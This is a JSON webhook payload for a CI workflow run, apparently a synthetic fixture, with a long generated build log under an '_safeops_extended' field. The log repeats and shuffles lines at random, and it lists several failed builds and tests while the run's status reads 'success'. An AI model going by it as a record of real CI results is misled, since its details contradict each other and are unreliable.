{
  "action": "completed",
  "workflow_run": {
    "id": 342,
    "name": "CI Pipeline",
    "head_branch": "develop",
    "head_sha": "d9fe29ecdae7a689281ba35c2967616d0a172ea2",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-12-05T12:00:24.308044Z",
    "updated_at": "2025-12-05T12:02:52.836828Z"
  },
  "repository": {
    "full_name": "acme-corp/data-pipeline",
    "name": "data-pipeline"
  },
  "sender": {
    "login": "bob"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: setup_environment ===\nArtifact uploaded: build.tar.gz (38MB)\nInstalling react@1.13.0\nStep 3/10: Building\nCache hit for key-7092\nInstalling express@2.10.0\nCache hit for key-4642\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nInstalling axios@4.9.0\n\u2713 build completed\n  PASS: test_user_create (270ms)\n\u2713 lint completed\n  PASS: test_cache_hit (139ms)\nStep 6/10: Building\nInstalling jest@5.9.0\nInstalling eslint@2.6.0\n[12:00:24] INFO: Processing request\nStep 3/10: Building\nStep 6/10: Building\n  PASS: test_user_create (50ms)\nCache hit for key-4946\nCache hit for key-9608\nArtifact uploaded: build.tar.gz (20MB)\nArtifact uploaded: build.tar.gz (31MB)\nArtifact uploaded: build.tar.gz (2MB)\nCache hit for key-8415\nStep 2/10: Building\nInstalling axios@2.8.0\n\u2713 build completed\n\u2713 lint completed\n[12:00:24] ERROR: Connection failed\nStep 4/10: Building\nCompiling src/utils.go...\nCache hit for key-2174\n[12:00:24] INFO: Processing request\nStep 8/10: Building\nInstalling jest@4.19.0\nCompiling src/index.js...\nStep 7/10: Building\nWARNING: express has known vulnerabilities\nInstalling jest@2.12.0\nCache hit for key-5431\nInstalling react@1.17.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2713 lint completed\n[12:00:24] INFO: Processing request\nStep 8/10: Building\nCompiling src/index.js...\n[12:00:24] INFO: Processing request\n  PASS: test_db_connect (345ms)\n\u2713 build completed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache hit for key-2079\nException: ValueError\n\u2713 lint completed\n\u2713 lint completed\nCache hit for key-2588\n[12:00:24] WARN: Deprecated API usage\n  PASS: test_db_connect (381ms)\nCompiling src/main.py...\nStep 6/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nWARNING: axios has known vulnerabilities\nArtifact uploaded: build.tar.gz (30MB)\nStep 8/10: Building\nStep 10/10: Building\n[12:00:24] INFO: Processing request\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (17MB)\n  PASS: test_db_connect (415ms)\n\u2713 test completed\n  PASS: test_user_create (415ms)\nCompiling src/utils.go...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact uploaded: build.tar.gz (31MB)\nCache hit for key-4809\n  PASS: test_cache_hit (421ms)\nStep 2/10: Building\nInstalling eslint@4.19.0\nInstalling eslint@4.8.0\nCompiling src/handler.rs...\nStep 6/10: Building\nCompiling src/utils.go...\nInstalling jest@2.13.0\n\u2713 lint completed\nInstalling jest@5.18.0\nArtifact uploaded: build.tar.gz (6MB)\nArtifact uploaded: build.tar.gz (11MB)\nArtifact uploaded: build.tar.gz (15MB)\nCompiling src/main.py...\n  PASS: test_api_health (86ms)\n\u2717 build failed with exit code 50\nArtifact uploaded: build.tar.gz (14MB)\n[12:00:24] INFO: Processing request\nArtifact uploaded: build.tar.gz (21MB)\n[12:00:24] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nInstalling axios@4.15.0\nCache hit for key-3454\n\u2713 lint completed\n[12:00:24] INFO: Processing request\n[12:00:24] INFO: Processing request\n[12:00:24] INFO: Processing request\nArtifact uploaded: build.tar.gz (35MB)\nStep 4/10: Building\n[12:00:24] INFO: Processing request\n\u2713 test completed\n  PASS: test_cache_hit (59ms)\nCache hit for key-7373\n[12:00:24] INFO: Processing request\n  PASS: test_cache_hit (303ms)\nInstalling prettier@3.8.0\nStep 4/10: Building\nInstalling eslint@3.4.0\nArtifact uploaded: build.tar.gz (32MB)\nArtifact uploaded: build.tar.gz (16MB)\n  PASS: test_user_create (171ms)\n[12:00:24] INFO: Processing request\nInstalling prettier@2.7.0\nCompiling src/utils.go...\nCache hit for key-1720\nCache hit for key-7843\n[12:00:24] INFO: Processing request\nInstalling prettier@4.10.0\n[12:00:24] INFO: Processing request\nCompiling src/utils.go...\nCache hit for key-5822\n\u2713 lint completed\nCache hit for key-4643\nInstalling jest@2.8.0\n  PASS: test_auth_login (283ms)\nCache hit for key-4970\nCache hit for key-3094\n[12:00:24] INFO: Processing request\nCache hit for key-1250\n\u2713 lint completed\nCache hit for key-1550\n  PASS: test_auth_login (151ms)\n\u2713 build completed\nCache hit for key-6726\nCache hit for key-9664\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling src/service.java...\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (43MB)\nStep 2/10: Building\nInstalling jest@3.1.0\nCache hit for key-9229\nStep 8/10: Building\nInstalling eslint@4.14.0\nArtifact uploaded: build.tar.gz (46MB)\nStep 2/10: Building\nArtifact uploaded: build.tar.gz (14MB)\nException: RuntimeError\n\u2713 lint completed\n\u2713 build completed\n[12:00:24] INFO: Processing request\nCache hit for key-2710\nCache hit for key-6513\n  PASS: test_user_create (218ms)\nArtifact uploaded: build.tar.gz (7MB)\nArtifact uploaded: build.tar.gz (39MB)\n[12:00:24] INFO: Processing request\n\u2713 test completed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nWARNING: eslint has known vulnerabilities\n=== Step setup_environment completed ===\n=== Step: e2e_tests ===\n  PASS: test_auth_login (81ms)\nWARNING: lodash has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache hit for key-9540\n  PASS: test_user_create (339ms)\nCompiling src/utils.go...\nStep 4/10: Building\nCache hit for key-7113\nStep 2/10: Building\nArtifact uploaded: build.tar.gz (16MB)\nCache hit for key-6764\n\u2713 lint completed\n\u2713 lint completed\nCache hit for key-1885\n[12:00:24] INFO: Processing request\nCache hit for key-4779\n[12:00:24] INFO: Processing request\n[12:00:24] INFO: Processing request\n\u2713 lint completed\nCache hit for key-3417\nArtifact uploaded: build.tar.gz (1MB)\nCache hit for key-6586\nInstalling react@1.0.0\n[12:00:24] WARN: Deprecated API usage\n  PASS: test_api_health (11ms)\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (49MB)\nStep 2/10: Building\nStep 10/10: Building\nFAILED: test_db_connect\n[12:00:24] ERROR: Connection failed\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (23MB)\nCache hit for key-4252\n[12:00:24] WARN: Deprecated API usage\nInstalling webpack@2.3.0\nCache hit for key-1945\nArtifact uploaded: build.tar.gz (25MB)\n\u2713 build completed\nCompiling src/handler.rs...\nCache hit for key-2404\nWARNING: express has known vulnerabilities\nCompiling src/app.ts...\nInstalling react@2.11.0\nCache hit for key-6323\nStep 9/10: Building\nStep 3/10: Building\nStep 6/10: Building\nInstalling prettier@2.17.0\n\u2713 build completed\nWARNING: jest has known vulnerabilities\n  PASS: test_user_create (187ms)\nArtifact uploaded: build.tar.gz (43MB)\nCompiling src/main.py...\nInstalling prettier@3.5.0\nInstalling webpack@4.14.0\nCache hit for key-7013\nStep 2/10: Building\nCache hit for key-2723\nCache hit for key-1181\nStep 6/10: Building\nCompiling src/service.java...\n\u2713 build completed\nFAILED: test_auth_login\n\u2713 build completed\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (19MB)\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (17MB)\nCompiling src/utils.go...\n  PASS: test_api_health (379ms)\nArtifact uploaded: build.tar.gz (4MB)\nCache hit for key-6437\n  PASS: test_db_connect (170ms)\n  PASS: test_auth_login (122ms)\n[12:00:24] INFO: Processing request\nInstalling express@4.3.0\nStep 8/10: Building\nStep 9/10: Building\nStep 4/10: Building\n  PASS: test_db_connect (1ms)\nCompiling src/service.java...\n\u2713 test completed\nStep 9/10: Building\nCache hit for key-2176\nWARNING: axios has known vulnerabilities\nInstalling eslint@2.9.0\nArtifact uploaded: build.tar.gz (35MB)\nCache hit for key-1244\nCache hit for key-3119\n[12:00:24] WARN: Deprecated API usage\n[12:00:24] INFO: Processing request\n\u2713 build completed\n[12:00:24] WARN: Deprecated API usage\n  PASS: test_db_connect (306ms)\nCompiling src/app.ts...\n  PASS: test_api_health (47ms)\nInstalling eslint@2.18.0\n  PASS: test_cache_hit (435ms)\nInstalling eslint@5.17.0\nArtifact uploaded: build.tar.gz (9MB)\nInstalling webpack@2.7.0\n  PASS: test_cache_hit (208ms)\n[12:00:24] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n  PASS: test_cache_hit (307ms)\nStep 1/10: Building\nStep 4/10: Building\nStep 5/10: Building\n  PASS: test_user_create (204ms)\nInstalling axios@4.1.0\nCompiling src/main.py...\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (2MB)\nArtifact uploaded: build.tar.gz (2MB)\nArtifact uploaded: build.tar.gz (31MB)\nArtifact uploaded: build.tar.gz (21MB)\nArtifact uploaded: build.tar.gz (24MB)\n\u2713 lint completed\n[12:00:24] INFO: Processing request\nArtifact uploaded: build.tar.gz (33MB)\n[12:00:24] INFO: Processing request\nCompiling src/app.ts...\n  PASS: test_auth_login (83ms)\n  PASS: test_user_create (163ms)\nWARNING: react has known vulnerabilities\n[12:00:24] INFO: Processing request\n  PASS: test_db_connect (269ms)\nInstalling lodash@5.7.0\nCache hit for key-3969\n\u2713 lint completed\nStep 2/10: Building\nCache hit for key-1023\nCompiling src/app.ts...\nCache hit for key-7216\nCompiling src/index.js...\nInstalling jest@5.15.0\n[12:00:24] INFO: Processing request\nArtifact uploaded: build.tar.gz (14MB)\nStep 9/10: Building\nCompiling src/service.java...\nInstalling webpack@4.12.0\nArtifact uploaded: build.tar.gz (30MB)\nStep 6/10: Building\n[12:00:24] INFO: Processing request\nCompiling src/utils.go...\nStep 6/10: Building\nCache hit for key-5180\nArtifact uploaded: build.tar.gz (32MB)\nInstalling react@1.6.0\n  PASS: test_api_health (249ms)\nFAILED: test_api_health\nStep 7/10: Building\n  PASS: test_api_health (195ms)\n  PASS: test_auth_login (16ms)\n\u2713 lint completed\n\u2713 build completed\n  PASS: test_api_health (400ms)\n[12:00:24] INFO: Processing request\n\u2713 test completed\nArtifact uploaded: build.tar.gz (14MB)\n[12:00:24] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nInstalling eslint@4.17.0\nCache hit for key-2771\n=== Step e2e_tests completed ===\n=== Step: lint ===\n\u2713 test completed\nCache hit for key-3747\n  PASS: test_api_health (317ms)\n[12:00:24] INFO: Processing request\nCompiling src/main.py...\n  PASS: test_auth_login (311ms)\nArtifact uploaded: build.tar.gz (47MB)\nArtifact uploaded: build.tar.gz (1MB)\n[12:00:24] INFO: Processing request\n[12:00:24] INFO: Processing request\nStep 9/10: Building\n[12:00:24] INFO: Processing request\nCompiling src/utils.go...\nInstalling prettier@2.10.0\nArtifact uploaded: build.tar.gz (41MB)\nStep 9/10: Building\n[12:00:24] INFO: Processing request\nFAILED: test_user_create\nCache hit for key-7154\nStep 10/10: Building\n  PASS: test_cache_hit (57ms)\n  PASS: test_api_health (175ms)\nStep 6/10: Building\nCache hit for key-4061\nCompiling src/service.java...\nCompiling src/handler.rs...\n[12:00:24] INFO: Processing request\nCompiling src/index.js...\n[12:00:24] INFO: Processing request\nCompiling src/service.java...\nCache hit for key-8573\n[12:00:24] INFO: Processing request\nStep 2/10: Building\nInstalling lodash@3.6.0\n[12:00:24] INFO: Processing request\nException: TypeError\n  PASS: test_db_connect (198ms)\nStep 2/10: Building\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (5MB)\nInstalling axios@1.19.0\n[12:00:24] INFO: Processing request\nArtifact uploaded: build.tar.gz (48MB)\nStep 6/10: Building\nStep 4/10: Building\n\u2717 build failed with exit code 27\nInstalling jest@2.20.0\n\u2713 build completed\n[12:00:24] WARN: Deprecated API usage\n[12:00:24] INFO: Processing request\n[12:00:24] INFO: Processing request\n  PASS: test_cache_hit (369ms)\n[12:00:24] INFO: Processing request\nInstalling react@1.14.0\nInstalling axios@1.4.0\nCache hit for key-6721\nArtifact uploaded: build.tar.gz (7MB)\nInstalling lodash@1.7.0\nCache hit for key-1629\n\u2713 test completed\nCompiling src/handler.rs...\nCompiling src/service.java...\n  PASS: test_cache_hit (468ms)\nArtifact uploaded: build.tar.gz (21MB)\nArtifact uploaded: build.tar.gz (27MB)\nInstalling webpack@1.20.0\nStep 1/10: Building\n[12:00:24] INFO: Processing request\n  PASS: test_auth_login (233ms)\n  PASS: test_cache_hit (280ms)\n  PASS: test_db_connect (130ms)\nInstalling axios@2.7.0\nStep 9/10: Building\nCompiling src/index.js...\n  PASS: test_cache_hit (310ms)\nArtifact uploaded: build.tar.gz (23MB)\n  PASS: test_api_health (362ms)\n  PASS: test_cache_hit (376ms)\nArtifact uploaded: build.tar.gz (33MB)\nArtifact uploaded: build.tar.gz (36MB)\nCache hit for key-9107\n[12:00:24] INFO: Processing request\n  PASS: test_cache_hit (484ms)\n  PASS: test_auth_login (207ms)\nCompiling src/service.java...\nInstalling express@2.15.0\n\u2713 build completed\n\u2713 test completed\nArtifact uploaded: build.tar.gz (8MB)\n[12:00:24] INFO: Processing request\nStep 7/10: Building\n  PASS: test_api_health (307ms)\nInstalling lodash@4.0.0\nStep 7/10: Building\n[12:00:24] INFO: Processing request\nInstalling prettier@3.19.0\nArtifact uploaded: build.tar.gz (23MB)\n[12:00:24] ERROR: Connection failed\n\u2713 lint completed\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (17MB)\nCompiling src/utils.go...\n\u2713 build completed\nCompiling src/service.java...\n\u2713 test completed\nArtifact uploaded: build.tar.gz (50MB)\n\u2713 test completed\nArtifact uploaded: build.tar.gz (50MB)\n\u2713 test completed\n[12:00:24] INFO: Processing request\n[12:00:24] INFO: Processing request\nInstalling webpack@1.16.0\n[12:00:24] WARN: Deprecated API usage\n\u2713 test completed\nCache hit for key-4873\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (50MB)\nArtifact uploaded: build.tar.gz (24MB)\n\u2713 lint completed\n\u2713 build completed\nInstalling eslint@4.13.0\nCompiling src/service.java...\nCompiling src/handler.rs...\nCache hit for key-5746\nCompiling src/utils.go...\n  PASS: test_cache_hit (336ms)\nCompiling src/index.js...\nInstalling eslint@3.6.0\nFAILED: test_cache_hit\n[12:00:24] INFO: Processing request\nCompiling src/utils.go...\nCache hit for key-6601\n\u2713 test completed\nInstalling axios@1.18.0\nInstalling axios@5.7.0\nInstalling axios@1.3.0\nStep 7/10: Building\n\u2713 test completed\nStep 7/10: Building\n\u2713 build completed\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (23MB)\nArtifact uploaded: build.tar.gz (38MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n  PASS: test_db_connect (163ms)\nArtifact uploaded: build.tar.gz (21MB)\n  PASS: test_auth_login (274ms)\nCache hit for key-1887\n[12:00:24] INFO: Processing request\nInstalling jest@2.14.0\nStep 7/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nInstalling webpack@2.17.0\nInstalling jest@2.9.0\n[12:00:24] INFO: Processing request\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (3MB)\n  PASS: test_cache_hit (141ms)\nInstalling eslint@2.5.0\nCompiling src/main.py...\nInstalling jest@4.15.0\nCache hit for key-3197\nStep 4/10: Building\nStep 9/10: Building\nStep 7/10: Building\n=== Step lint completed ===\n=== Step: type_check ===\n\u2713 test completed\n\u2717 build failed with exit code 45\nStep 3/10: Building\nInstalling eslint@1.12.0\n\u2713 test completed\nStep 2/10: Building\nCompiling src/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n  PASS: test_db_connect (58ms)\nException: ValueError\n[12:00:24] INFO: Processing request\nArtifact uploaded: build.tar.gz (50MB)\n[12:00:24] WARN: Deprecated API usage\n\u2713 test completed\nCompiling src/utils.go...\n[12:00:24] WARN: Deprecated API usage\nCache hit for key-4576\n[12:00:24] INFO: Processing request\n\u2713 test completed\nCompiling src/utils.go...\n  PASS: test_api_health (167ms)\nCompiling src/utils.go...\nInstalling eslint@5.5.0\n  PASS: test_user_create (21ms)\n[12:00:24] INFO: Processing request\nFAILED: test_cache_hit\nStep 5/10: Building\nInstalling prettier@3.10.0\nStep 3/10: Building\nCache hit for key-9987\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (37MB)\nInstalling express@1.14.0\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (14MB)\nInstalling jest@3.9.0\n[12:00:24] INFO: Processing request\nCache hit for key-9789\nCompiling src/handler.rs...\nInstalling axios@3.15.0\n  PASS: test_api_health (453ms)\nCompiling src/service.java...\n[12:00:24] INFO: Processing request\nArtifact uploaded: build.tar.gz (8MB)\nArtifact uploaded: build.tar.gz (25MB)\nInstalling lodash@4.17.0\nArtifact uploaded: build.tar.gz (34MB)\nArtifact uploaded: build.tar.gz (44MB)\nCache hit for key-7402\nArtifact uploaded: build.tar.gz (3MB)\n  PASS: test_api_health (128ms)\nStep 7/10: Building\n\u2713 build completed\n\u2713 test completed\nCache hit for key-9778\n[12:00:24] INFO: Processing request\nArtifact uploaded: build.tar.gz (45MB)\nCache hit for key-9022\nArtifact uploaded: build.tar.gz (1MB)\n\u2713 build completed\n\u2713 build completed\nCache hit for key-1739\nCache hit for key-9347\nCache hit for key-7175\nCache hit for key-4881\nArtifact uploaded: build.tar.gz (18MB)\n  PASS: test_api_health (165ms)\nException: TypeError\n[12:00:24] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nWARNING: lodash has known vulnerabilities\nCompiling src/utils.go...\nInstalling jest@5.5.0\n  PASS: test_db_connect (218ms)\n[12:00:24] INFO: Processing request\n[12:00:24] INFO: Processing request\n  PASS: test_auth_login (167ms)\nCompiling src/utils.go...\nStep 10/10: Building\nArtifact uploaded: build.tar.gz (19MB)\n[12:00:24] INFO: Processing request\nInstalling lodash@4.14.0\n  PASS: test_db_connect (269ms)\n\u2713 test completed\n[12:00:24] WARN: Deprecated API usage\nCache hit for key-6022\nCache hit for key-3005\nArtifact uploaded: build.tar.gz (5MB)\nCompiling src/handler.rs...\nStep 2/10: Building\nArtifact uploaded: build.tar.gz (26MB)\nInstalling jest@4.10.0\n  PASS: test_db_connect (82ms)\nWARNING: lodash has known vulnerabilities\nInstalling prettier@1.17.0\nStep 8/10: Building\nCompiling src/service.java...\nStep 9/10: Building\n[12:00:24] INFO: Processing request\nArtifact uploaded: build.tar.gz (40MB)\n\u2713 lint completed\n\u2713 build completed\n[12:00:24] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n  PASS: test_auth_login (321ms)\nCache hit for key-2511\n[12:00:24] INFO: Processing request\nInstalling react@3.7.0\nCompiling src/handler.rs...\n[12:00:24] INFO: Processing request\nArtifact uploaded: build.tar.gz (10MB)\nStep 2/10: Building\n  PASS: test_api_health (375ms)\n  PASS: test_db_connect (155ms)\nCache hit for key-5054\nArtifact uploaded: build.tar.gz (25MB)\n[12:00:24] INFO: Processing request\nCompiling src/utils.go...\nCache hit for key-2270\nFAILED: test_db_connect\nCompiling src/index.js...\nWARNING: express has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:00:24] INFO: Processing request\nArtifact uploaded: build.tar.gz (44MB)\n\u2713 lint completed\nCompiling src/handler.rs...\n  PASS: test_cache_hit (167ms)\nStep 5/10: Building\n\u2713 test completed\nArtifact uploaded: build.tar.gz (41MB)\nArtifact uploaded: build.tar.gz (9MB)\n\u2713 build completed\nInstalling lodash@1.8.0\nCache hit for key-5021\n\u2713 build completed\n\u2713 lint completed\nCompiling src/handler.rs...\nStep 3/10: Building\n[12:00:24] INFO: Processing request\nInstalling react@3.20.0\n[12:00:24] INFO: Processing request\n  PASS: test_auth_login (237ms)\n  PASS: test_auth_login (241ms)\n\u2713 test completed\n\u2713 lint completed\nCache hit for key-6740\n[12:00:24] INFO: Processing request\nCompiling src/main.py...\n  PASS: test_db_connect (230ms)\nWARNING: jest has known vulnerabilities\nInstalling axios@4.9.0\nStep 4/10: Building\nInstalling webpack@5.2.0\nCompiling src/index.js...\n  PASS: test_auth_login (183ms)\nCompiling src/handler.rs...\nCache hit for key-9628\nCache hit for key-5314\nInstalling express@5.3.0\nCache hit for key-7768\nInstalling webpack@2.14.0\n[12:00:24] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nInstalling prettier@3.8.0\n=== Step type_check completed ===\n=== Step: restore_cache ===\nCompiling src/utils.go...\nStep 6/10: Building\n[12:00:24] INFO: Processing request\n  PASS: test_cache_hit (256ms)\nCompiling src/index.js...\n\u2713 lint completed\n\u2713 build completed\nStep 9/10: Building\nCache hit for key-9439\nArtifact uploaded: build.tar.gz (7MB)\nArtifact uploaded: build.tar.gz (29MB)\n\u2713 build completed\nInstalling express@1.7.0\n[12:00:24] ERROR: Connection failed\nCache hit for key-9560\nInstalling lodash@1.17.0\n[12:00:24] ERROR: Connection failed\nCompiling src/main.py...\n\u2713 lint completed\nCache hit for key-7827\nInstalling express@4.13.0\n  PASS: test_api_health (353ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact uploaded: build.tar.gz (7MB)\nArtifact uploaded: build.tar.gz (13MB)\n  PASS: test_api_health (400ms)\nCompiling src/service.java...\n  PASS: test_cache_hit (166ms)\nCompiling src/handler.rs...\nCache hit for key-6493\nCache hit for key-4142\nStep 7/10: Building\nInstalling eslint@5.13.0\nInstalling express@2.17.0\nArtifact uploaded: build.tar.gz (46MB)\nStep 2/10: Building\n  PASS: test_cache_hit (139ms)\nWARNING: axios has known vulnerabilities\nCache hit for key-2865\n[12:00:24] INFO: Processing request\n  PASS: test_auth_login (469ms)\nStep 3/10: Building\nCache hit for key-9096\nStep 7/10: Building\nStep 1/10: Building\nCompiling src/app.ts...\nCompiling src/service.java...\n[12:00:24] INFO: Processing request\nStep 9/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:00:24] INFO: Processing request\nStep 7/10: Building\nCompiling src/app.ts...\n[12:00:24] INFO: Processing request\n[12:00:24] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (13MB)\n[12:00:24] INFO: Processing request\nFAILED: test_auth_login\nCache hit for key-9778\n\u2713 build completed\nInstalling axios@4.6.0\nStep 1/10: Building\n[12:00:24] INFO: Processing request\nArtifact uploaded: build.tar.gz (11MB)\n\u2713 test completed\n  PASS: test_auth_login (73ms)\n[12:00:24] INFO: Processing request\n\u2713 test completed\nWARNING: jest has known vulnerabilities\n  PASS: test_user_create (68ms)\n  PASS: test_db_connect (379ms)\nWARNING: jest has known vulnerabilities\n  PASS: test_db_connect (39ms)\n\u2713 build completed\nInstalling axios@4.19.0\nArtifact uploaded: build.tar.gz (43MB)\nArtifact uploaded: build.tar.gz (30MB)\nStep 5/10: Building\n  PASS: test_db_connect (278ms)\nWARNING: axios has known vulnerabilities\n\u2713 build completed\n[12:00:24] INFO: Processing request\n[12:00:24] INFO: Processing request\n[12:00:24] INFO: Processing request\n\u2713 lint completed\nCompiling src/main.py...\n\u2717 build failed with exit code 112\n  PASS: test_cache_hit (447ms)\n\u2713 lint completed\nInstalling jest@2.1.0\nCompiling src/app.ts...\n\u2713 lint completed\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n  PASS: test_api_health (145ms)\n[12:00:24] INFO: Processing request\n[12:00:24] INFO: Processing request\nCache hit for key-6278\nCompiling src/main.py...\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (47MB)\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (36MB)\n[12:00:24] INFO: Processing request\nStep 4/10: Building\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (34MB)\n\u2713 lint completed\nStep 5/10: Building\nWARNING: eslint has known vulnerabilities\n  PASS: test_db_connect (397ms)\nInstalling react@4.13.0\nInstalling lodash@4.14.0\n[12:00:24] INFO: Processing request\n  PASS: test_db_connect (343ms)\nInstalling react@5.0.0\n  PASS: test_user_create (394ms)\n\u2713 build completed\n  PASS: test_user_create (98ms)\nCompiling src/main.py...\n\u2717 build failed with exit code 16\nWARNING: eslint has known vulnerabilities\n  PASS: test_user_create (147ms)\nArtifact uploaded: build.tar.gz (48MB)\nCache hit for key-8936\n[12:00:24] INFO: Processing request\nInstalling lodash@5.3.0\n  PASS: test_db_connect (381ms)\nArtifact uploaded: build.tar.gz (40MB)\n\u2713 test completed\nWARNING: react has known vulnerabilities\n  PASS: test_db_connect (182ms)\n[12:00:24] INFO: Processing request\nArtifact uploaded: build.tar.gz (35MB)\n[12:00:24] INFO: Processing request\n  PASS: test_api_health (17ms)\n  PASS: test_cache_hit (18ms)\nCache hit for key-6211\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (47MB)\nInstalling axios@2.17.0\nCompiling src/main.py...\nCache hit for key-9546\nInstalling axios@5.13.0\n\u2713 build completed\nCompiling src/index.js...\n[12:00:24] WARN: Deprecated API usage\n[12:00:24] INFO: Processing request\n\u2713 build completed\nInstalling lodash@4.3.0\nInstalling webpack@3.14.0\n\u2713 test completed\n\u2713 test completed\n[12:00:24] INFO: Processing request\nInstalling react@5.4.0\n\u2713 test completed\nArtifact uploaded: build.tar.gz (13MB)\nInstalling eslint@5.14.0\nInstalling lodash@4.6.0\nCompiling src/utils.go...\nCompiling src/utils.go...\n\u2713 lint completed\nCompiling src/app.ts...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nWARNING: webpack has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n=== Step restore_cache completed ===\n=== Step: save_cache ===\nWARNING: react has known vulnerabilities\n  PASS: test_api_health (8ms)\nCache hit for key-3362\n[12:00:24] ERROR: Connection failed\nCompiling src/app.ts...\n  PASS: test_cache_hit (246ms)\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (45MB)\nInstalling jest@3.18.0\nInstalling webpack@1.11.0\nStep 1/10: Building\n\u2717 build failed with exit code 84\nInstalling lodash@1.7.0\nCompiling src/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact uploaded: build.tar.gz (9MB)\n\u2713 build completed\nStep 7/10: Building\n\u2713 lint completed\nCache hit for key-2862\nStep 9/10: Building\n  PASS: test_auth_login (460ms)\n[12:00:24] INFO: Processing request\nCompiling src/service.java...\n[12:00:24] INFO: Processing request\nWARNING: lodash has known vulnerabilities\nStep 2/10: Building\nInstalling react@2.20.0\nArtifact uploaded: build.tar.gz (12MB)\nStep 5/10: Building\n[12:00:24] INFO: Processing request\nInstalling prettier@1.3.0\nArtifact uploaded: build.tar.gz (6MB)\nInstalling webpack@1.12.0\nArtifact uploaded: build.tar.gz (13MB)\nInstalling webpack@2.7.0\nArtifact uploaded: build.tar.gz (30MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache hit for key-9717\n[12:00:24] INFO: Processing request\n\u2713 test completed\n\u2713 lint completed\nInstalling express@3.11.0\n[12:00:24] INFO: Processing request\nCache hit for key-6776\nStep 6/10: Building\nCompiling src/app.ts...\nCompiling src/app.ts...\nCompiling src/index.js...\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (21MB)\nInstalling react@3.19.0\n\u2713 build completed\n[12:00:24] WARN: Deprecated API usage\n  PASS: test_user_create (373ms)\n[12:00:24] INFO: Processing request\n  PASS: test_cache_hit (234ms)\n[12:00:24] INFO: Processing request\nArtifact uploaded: build.tar.gz (18MB)\nArtifact uploaded: build.tar.gz (31MB)\n\u2713 build completed\n[12:00:24] INFO: Processing request\n\u2713 lint completed\n\u2713 test completed\n[12:00:24] INFO: Processing request\n  PASS: test_auth_login (252ms)\nStep 5/10: Building\n[12:00:24] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact uploaded: build.tar.gz (34MB)\nWARNING: eslint has known vulnerabilities\nException: NullPointerException\n\u2713 build completed\nInstalling react@1.7.0\nInstalling react@2.14.0\nStep 10/10: Building\n\u2713 build completed\nCompiling src/app.ts...\n\u2713 lint completed\nCompiling src/main.py...\n\u2713 lint completed\nCompiling src/handler.rs...\n  PASS: test_api_health (19ms)\nInstalling express@2.19.0\nWARNING: react has known vulnerabilities\nStep 9/10: Building\n  PASS: test_db_connect (450ms)\nStep 9/10: Building\n[12:00:24] INFO: Processing request\nCompiling src/handler.rs...\nInstalling webpack@4.12.0\n[12:00:24] ERROR: Connection failed\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (14MB)\n[12:00:24] INFO: Processing request\n[12:00:24] INFO: Processing request\nInstalling jest@2.3.0\n  PASS: test_auth_login (52ms)\n[12:00:24] INFO: Processing request\nInstalling lodash@5.5.0\nWARNING: react has known vulnerabilities\nCache hit for key-3976\nCache hit for key-5324\nArtifact uploaded: build.tar.gz (33MB)\nArtifact uploaded: build.tar.gz (20MB)\nStep 1/10: Building\n  PASS: test_cache_hit (55ms)\nArtifact uploaded: build.tar.gz (14MB)\nArtifact uploaded: build.tar.gz (39MB)\nStep 7/10: Building\n[12:00:24] INFO: Processing request\nStep 10/10: Building\nCache hit for key-4012\nStep 8/10: Building\n  PASS: test_user_create (150ms)\n  PASS: test_user_create (265ms)\nCache hit for key-1290\nCache hit for key-6533\nCompiling src/main.py...\nCompiling src/index.js...\nInstalling eslint@2.3.0\nCache hit for key-5416\n\u2713 test completed\nInstalling react@2.16.0\n[12:00:24] INFO: Processing request\n[12:00:24] INFO: Processing request\nCompiling src/service.java...\nCompiling src/app.ts...\nWARNING: react has known 